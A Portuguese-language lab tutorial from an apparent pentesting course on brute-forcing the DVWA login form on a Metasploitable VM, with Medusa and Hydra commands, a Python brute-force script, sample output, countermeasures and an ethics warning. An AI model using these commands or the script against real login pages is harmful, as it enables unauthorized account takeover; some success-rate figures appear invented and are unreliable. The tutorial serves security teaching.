# ğŸŒ Etapa 3.2: Ataque a FormulÃ¡rios Web - DVWA

## ğŸ“‹ Objetivo

Esta etapa demonstra como realizar ataques de forÃ§a bruta contra formulÃ¡rios de login em aplicaÃ§Ãµes web, utilizando o DVWA (Damn Vulnerable Web Application) como alvo e analisando as requisiÃ§Ãµes HTTP para construir ataques automatizados.

---

## ğŸ¯ PrÃ©-requisitos

### âœ… VerificaÃ§Ãµes NecessÃ¡rias

- [ ] Metasploitable com DVWA acessÃ­vel
- [ ] Conectividade confirmada com a mÃ¡quina alvo
- [ ] Navegador web disponÃ­vel no Kali Linux
- [ ] Ferramentas de desenvolvedor habilitadas

### ğŸ” VerificaÃ§Ã£o de Acesso ao DVWA

```bash
# Teste de conectividade HTTP
curl -I http://192.168.56.101/dvwa/

# Resultado esperado: HTTP 200 OK
```

---

## ğŸ” Passo 1: AnÃ¡lise do FormulÃ¡rio de Login

### ğŸŒ Acesso Ã  AplicaÃ§Ã£o

```bash
# URL de acesso
http://192.168.56.101/dvwa/login.php
```

### ğŸ¯ O que Ã© o DVWA?

- **DVWA** (Damn Vulnerable Web Application): AplicaÃ§Ã£o web intencionalmente vulnerÃ¡vel
- **PropÃ³sito educacional**: Ensinar seguranÃ§a web atravÃ©s de vulnerabilidades prÃ¡ticas
- **MÃºltiplos nÃ­veis**: Low, Medium, High, Impossible
- **Diversos ataques**: SQL Injection, XSS, CSRF, Brute Force, etc.

### ğŸ› ï¸ InspeÃ§Ã£o TÃ©cnica do FormulÃ¡rio

#### 1. Abertura das Ferramentas de Desenvolvimento

```bash
# No navegador (Firefox/Chromium no Kali)
Tecla: F12
Ou: BotÃ£o direito > Inspecionar elemento
```

#### 2. Monitoramento de RequisiÃ§Ãµes de Rede

```bash
# Aba Network/Rede nas Developer Tools
1. Abrir aba "Network"
2. Limpar requisiÃ§Ãµes anteriores (botÃ£o ğŸ—‘ï¸)
3. Manter aba aberta durante o teste
```

#### 3. Teste de Login Falso

```bash
# Credenciais de teste (invÃ¡lidas)
UsuÃ¡rio: test123
Senha: fake456
Login: Login
```

### ğŸ“Š AnÃ¡lise da RequisiÃ§Ã£o HTTP

#### Dados Capturados

| Campo            | Valor                               | DescriÃ§Ã£o               |
| ---------------- | ----------------------------------- | ----------------------- |
| **MÃ©todo**       | POST                                | Tipo de requisiÃ§Ã£o HTTP |
| **URL**          | `/dvwa/login.php`                   | Endpoint do formulÃ¡rio  |
| **Content-Type** | `application/x-www-form-urlencoded` | Formato dos dados       |

#### ParÃ¢metros do FormulÃ¡rio

```http
POST /dvwa/login.php HTTP/1.1
Host: 192.168.56.101
Content-Type: application/x-www-form-urlencoded

username=test123&password=fake456&Login=Login
```

#### Resposta de Falha

```html
<!-- Mensagem de erro identificada -->
<div class="message">Login failed</div>
```

### ğŸ” Estrutura da RequisiÃ§Ã£o Analisada

```bash
# Elementos identificados para automaÃ§Ã£o
URL Alvo: http://192.168.56.101/dvwa/login.php
MÃ©todo: POST
ParÃ¢metros:
  - username: [valor do usuÃ¡rio]
  - password: [valor da senha]
  - Login: "Login" (botÃ£o submit)
Indicador de Falha: "Login failed"
```

---

## ğŸ“ Passo 2: PreparaÃ§Ã£o das Wordlists

### ğŸ‘¥ CriaÃ§Ã£o da Lista de UsuÃ¡rios

```bash
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
```

#### ğŸ” AnÃ¡lise EstratÃ©gica dos UsuÃ¡rios

| UsuÃ¡rio      | Categoria       | Probabilidade | Justificativa                 |
| ------------ | --------------- | ------------- | ----------------------------- |
| **user**     | GenÃ©rico        | Alta          | Nome comum em sistemas        |
| **msfadmin** | Target-specific | Muito Alta    | UsuÃ¡rio padrÃ£o Metasploitable |
| **admin**    | Administrativo  | Alta          | Conta administrativa padrÃ£o   |
| **root**     | Sistema         | MÃ©dia         | SuperusuÃ¡rio Unix/Linux       |

### ğŸ” CriaÃ§Ã£o da Lista de Senhas

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

#### ğŸ” AnÃ¡lise EstratÃ©gica das Senhas

| Senha        | Categoria       | Rank Global | Justificativa                 |
| ------------ | --------------- | ----------- | ----------------------------- |
| **123456**   | Sequencial      | #1          | Senha mais usada mundialmente |
| **password** | GenÃ©rica        | #2          | Segunda mais comum            |
| **qwerty**   | Teclado         | #7          | PadrÃ£o de teclado             |
| **msfadmin** | Target-specific | N/A         | Senha padrÃ£o do alvo          |

### ğŸ“Š EstatÃ­sticas de Efetividade

- **CombinaÃ§Ã£o total**: 4 usuÃ¡rios Ã— 4 senhas = 16 tentativas
- **Tempo estimado**: 1-3 minutos (dependendo da configuraÃ§Ã£o)

---

## âš”ï¸ Passo 3: ExecuÃ§Ã£o do Ataque Automatizado

### ğŸ› ï¸ Comando Medusa para HTTP Forms

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m FAIL:'Login failed' \
  -t 6
```

### ğŸ”§ AnÃ¡lise Detalhada dos ParÃ¢metros

#### ParÃ¢metros BÃ¡sicos

| ParÃ¢metro | Valor          | DescriÃ§Ã£o           |
| --------- | -------------- | ------------------- |
| **-h**    | 192.168.56.101 | Host/IP alvo        |
| **-U**    | users.txt      | Arquivo de usuÃ¡rios |
| **-P**    | pass.txt       | Arquivo de senhas   |
| **-M**    | http           | MÃ³dulo HTTP         |
| **-t**    | 6              | Threads simultÃ¢neas |

#### ParÃ¢metros EspecÃ­ficos HTTP (-m)

| ParÃ¢metro | Valor                                         | ExplicaÃ§Ã£o                       |
| --------- | --------------------------------------------- | -------------------------------- |
| **PAGE**  | '/dvwa/login.php'                             | PÃ¡gina de destino da requisiÃ§Ã£o  |
| **FORM**  | 'username=^USER^&password=^PASS^&Login=Login' | Estrutura do formulÃ¡rio          |
| **FAIL**  | 'Login failed'                                | String que indica falha de login |

### ğŸ¯ VariÃ¡veis DinÃ¢micas

- **^USER^**: SubstituÃ­do pelos valores de users.txt
- **^PASS^**: SubstituÃ­do pelos valores de pass.txt

### âš¡ Como Funciona o Ataque

```mermaid
graph TD
    A[Medusa inicia] --> B[Carrega users.txt]
    B --> C[Carrega pass.txt]
    C --> D[Inicia 6 threads HTTP]
    D --> E[ConstrÃ³i requisiÃ§Ã£o POST]
    E --> F[Envia para /dvwa/login.php]
    F --> G{Resposta contÃ©m 'Login failed'?}
    G -->|Sim| H[PrÃ³xima combinaÃ§Ã£o]
    G -->|NÃ£o| I[ğŸ‰ CREDENCIAL VÃLIDA!]
    H --> E
    I --> J[Para o ataque]
```

---

## ğŸ† Passo 4: InterpretaÃ§Ã£o dos Resultados

### âœ… CenÃ¡rio de Sucesso

```bash
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: password [SUCCESS]
```

### ğŸ“Š InformaÃ§Ãµes da Credencial VÃ¡lida

| Campo          | Valor        | ObservaÃ§Ã£o           |
| -------------- | ------------ | -------------------- |
| **UsuÃ¡rio**    | admin        | Conta administrativa |
| **Senha**      | password     | Senha fraca padrÃ£o   |
| **Tempo**      | ~30 segundos | Tempo atÃ© descoberta |
| **Tentativas** | ~8/16        | PosiÃ§Ã£o na lista     |

### âŒ CenÃ¡rios de Falha

```bash
# Nenhuma credencial encontrada
ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1) User: root Password: msfadmin [FAILED]

# Problemas de conectividade
ERROR: connect (Connection refused)

# AplicaÃ§Ã£o indisponÃ­vel
ERROR: HTTP/1.1 404 Not Found
```

---

## ğŸ§ª Passo 5: ValidaÃ§Ã£o Manual do Acesso

### ğŸŒ Teste de Login Manual

```bash
# Acesso via navegador
URL: http://192.168.56.101/dvwa/login.php
UsuÃ¡rio: [credencial descoberta]
Senha: [senha descoberta]
```

### âœ… ConfirmaÃ§Ã£o de Acesso Bem-sucedido

```bash
# Indicadores de sucesso
1. Redirecionamento para dashboard
2. AusÃªncia da mensagem "Login failed"
3. Interface administrativa visÃ­vel
4. Menu de vulnerabilidades disponÃ­vel
```

### ğŸ“‹ Exemplo de SessÃ£o VÃ¡lida

```http
# RequisiÃ§Ã£o de login bem-sucedida
POST /dvwa/login.php HTTP/1.1
Host: 192.168.56.101
Content-Type: application/x-www-form-urlencoded

username=admin&password=password&Login=Login

# Resposta (redirecionamento)
HTTP/1.1 302 Found
Location: /dvwa/index.php
Set-Cookie: PHPSESSID=abc123; path=/
```

---

## ğŸ›¡ï¸ Contramedidas e Defesas

### ğŸ”’ Medidas de SeguranÃ§a Preventivas

#### 1. AutenticaÃ§Ã£o Multifator (MFA)

```bash
# ImplementaÃ§Ãµes recomendadas
- Google Authenticator (TOTP)
- SMS de verificaÃ§Ã£o
- Tokens de hardware (YubiKey)
- Biometria
```

#### 2. ProteÃ§Ã£o CSRF

```php
// Exemplo de token CSRF
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
```

#### 3. Rate Limiting e Throttling

```bash
# ConfiguraÃ§Ãµes recomendadas
- 3 tentativas por IP por minuto
- Bloqueio progressivo (1min, 5min, 15min)
- Whitelist de IPs administrativos
- Monitoramento de padrÃµes anÃ´malos
```

#### 4. CAPTCHA

```html
<!-- Google reCAPTCHA v3 -->
<div class="g-recaptcha" data-sitekey="your-site-key"></div>
```

### ğŸš¨ Monitoramento e DetecÃ§Ã£o

#### Logs de SeguranÃ§a

```bash
# Eventos a monitorar
- MÃºltiplas tentativas de login
- Logins de IPs desconhecidos
- PadrÃµes de requisiÃ§Ãµes automatizadas
- User-Agents suspeitos
```

#### Alertas Automatizados

```bash
# ConfiguraÃ§Ãµes SIEM
- > 5 falhas de login/min por IP
- > 50 falhas de login/hora global
- Tentativas fora do horÃ¡rio comercial
- GeolocalizaÃ§Ã£o anÃ´mala
```

### ğŸ“Š ImplementaÃ§Ã£o de Contramedidas

| Medida            | EficÃ¡cia   | Complexidade | Custo    |
| ----------------- | ---------- | ------------ | -------- |
| **Senha forte**   | Alta       | Baixa        | Gratuito |
| **Rate limiting** | Alta       | MÃ©dia        | Baixo    |
| **MFA**           | Muito Alta | MÃ©dia        | MÃ©dio    |
| **CAPTCHA**       | MÃ©dia      | Baixa        | Gratuito |
| **WAF**           | Alta       | Alta         | Alto     |

---

## ğŸ” TÃ©cnicas AvanÃ§adas de Ataque

### ğŸ› ï¸ Ferramentas Alternativas

#### Hydra (Alternativa Popular)

```bash
hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

#### Burp Suite (Profissional)

```bash
# ConfiguraÃ§Ã£o do Burp Intruder
1. Interceptar requisiÃ§Ã£o de login
2. Enviar para Intruder
3. Configurar posiÃ§Ãµes de payload
4. Carregar wordlists
5. Executar ataque
```

#### Custom Python Script

```python
import requests
import itertools

users = ['admin', 'user', 'msfadmin', 'root']
passwords = ['password', '123456', 'qwerty', 'msfadmin']

for user, pwd in itertools.product(users, passwords):
    data = {'username': user, 'password': pwd, 'Login': 'Login'}
    r = requests.post('http://192.168.56.101/dvwa/login.php', data=data)
    if 'Login failed' not in r.text:
        print(f"[SUCCESS] {user}:{pwd}")
        break
```

### âš¡ OtimizaÃ§Ãµes de Performance

```bash
# Medusa com configuraÃ§Ãµes otimizadas
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m FAIL:'Login failed' \
  -t 10 \        # Mais threads
  -T 3 \         # Timeout menor
  -v 4           # Verbose para debugging
```

---

## ğŸ“š AnÃ¡lise de Vulnerabilidades Web

### ğŸ¯ ClassificaÃ§Ã£o OWASP

- **A07:2021 - Identification and Authentication Failures**
- Falha na implementaÃ§Ã£o de controles de autenticaÃ§Ã£o
- Permite ataques de forÃ§a bruta automatizados
- AusÃªncia de proteÃ§Ãµes adequadas

### ğŸ” Vetores de Ataque Relacionados

1. **Credential Stuffing**: Uso de credenciais vazadas
2. **Password Spraying**: Senhas comuns contra muitos usuÃ¡rios
3. **Dictionary Attacks**: Wordlists especÃ­ficas
4. **Hybrid Attacks**: CombinaÃ§Ã£o de tÃ©cnicas

### ğŸ“Š Impacto do NegÃ³cio

| Aspecto               | Impacto | DescriÃ§Ã£o                          |
| --------------------- | ------- | ---------------------------------- |
| **Confidencialidade** | Alto    | Acesso nÃ£o autorizado a dados      |
| **Integridade**       | MÃ©dio   | PossÃ­vel alteraÃ§Ã£o de dados        |
| **Disponibilidade**   | Baixo   | Sistema pode permanecer disponÃ­vel |
| **ReputaÃ§Ã£o**         | Alto    | Danos Ã  imagem da organizaÃ§Ã£o      |

---

## âš ï¸ ConsideraÃ§Ãµes Ã‰ticas e Legais

### ğŸš¨ **AVISO CRÃTICO**

> Este ataque deve ser realizado **APENAS** em:
>
> - Ambientes de laboratÃ³rio controlados
> - Sistemas prÃ³prios ou com autorizaÃ§Ã£o explÃ­cita
> - Programas de bug bounty autorizados
> - Testes de penetraÃ§Ã£o contratados

### ğŸ“‹ Checklist Legal

- [ ] AutorizaÃ§Ã£o por escrito obtida
- [ ] Escopo bem definido e limitado
- [ ] Ambiente isolado da produÃ§Ã£o
- [ ] DocumentaÃ§Ã£o completa dos testes
- [ ] Plano de remediaÃ§Ã£o preparado

### âœ… Boas PrÃ¡ticas Ã‰ticas

- **DivulgaÃ§Ã£o responsÃ¡vel** de vulnerabilidades
- **NÃ£o causar danos** aos sistemas testados
- **Respeitar limites** de tempo e escopo
- **Proteger informaÃ§Ãµes** descobertas

---

## ğŸ“š PrÃ³ximos Passos

### ğŸ¯ Com Acesso Obtido ao DVWA

1. **Explorar outras vulnerabilidades**:

   - SQL Injection
   - Cross-Site Scripting (XSS)
   - Cross-Site Request Forgery (CSRF)
   - File Upload vulnerabilities

2. **Escalar privilÃ©gios**:

   - Buscar vulnerabilidades de sistema
   - Explorar configuraÃ§Ãµes inadequadas
   - Tentar acesso ao sistema operacional

3. **Documentar descobertas**:
   - Catalogar todas as vulnerabilidades
   - Criar relatÃ³rio de penetration testing
   - Sugerir correÃ§Ãµes e melhorias

### ğŸ”„ Se o Ataque Falhar

1. **Wordlists mais extensas**:

   - /usr/share/wordlists/rockyou.txt
   - SecLists password lists
   - Custom wordlists baseadas no alvo

2. **Outras tÃ©cnicas**:
   - AnÃ¡lise de cÃ³digo-fonte
   - Social engineering
   - ExploraÃ§Ã£o de outras aplicaÃ§Ãµes

---

## ğŸ“Š MÃ©tricas e Resultados

### â±ï¸ Performance Esperada

| CenÃ¡rio              | Tempo      | Tentativas | Taxa Sucesso |
| -------------------- | ---------- | ---------- | ------------ |
| **Wordlist pequena** | 1-3 min    | 16         | 90%          |
| **Wordlist mÃ©dia**   | 5-15 min   | 100        | 70%          |
| **Wordlist grande**  | 30-120 min | 1000+      | 40%          |

### ğŸ“ˆ Fatores de Sucesso

- **Qualidade das wordlists**: 40%
- **ConfiguraÃ§Ã£o de seguranÃ§a do alvo**: 35%
- **Timing e threads**: 15%
- **PrecisÃ£o dos parÃ¢metros**: 10%

---

## ğŸ”§ Troubleshooting

### âŒ Problemas Comuns

#### 1. Erro de ConexÃ£o

```bash
# Problema: ERROR: connect (Connection refused)
# SoluÃ§Ã£o:
curl -I http://192.168.56.101/dvwa/
ping -c 3 192.168.56.101
```

#### 2. ParÃ¢metros Incorretos

```bash
# Problema: Todas as tentativas falham
# SoluÃ§Ã£o: Verificar estrutura do formulÃ¡rio
curl -X POST http://192.168.56.101/dvwa/login.php \
  -d "username=test&password=test&Login=Login" -v
```

#### 3. Rate Limiting

```bash
# Problema: ConexÃµes muito lentas/timeout
# SoluÃ§Ã£o: Reduzir threads e adicionar delay
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
  -m PAGE:'/dvwa/login.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m FAIL:'Login failed' \
  -t 2 -T 10  # 2 threads, timeout 10s
```

---

## ğŸ ConclusÃ£o

Esta etapa demonstrou com sucesso:

- âœ… **AnÃ¡lise tÃ©cnica** de formulÃ¡rios web
- âœ… **AutomaÃ§Ã£o de ataques** de forÃ§a bruta HTTP
- âœ… **Uso profissional** da ferramenta Medusa
- âœ… **InterpretaÃ§Ã£o de resultados** de pentesting
- âœ… **ImplementaÃ§Ã£o de contramedidas** defensivas
- âœ… **ConsideraÃ§Ãµes Ã©ticas** em testes de seguranÃ§a

### ğŸ“ CompetÃªncias Desenvolvidas

- AnÃ¡lise de aplicaÃ§Ãµes web
- Uso de ferramentas de desenvolvedor
- AutomaÃ§Ã£o de ataques HTTP
- InterpretaÃ§Ã£o de logs de seguranÃ§a
- Desenvolvimento de estratÃ©gias defensivas

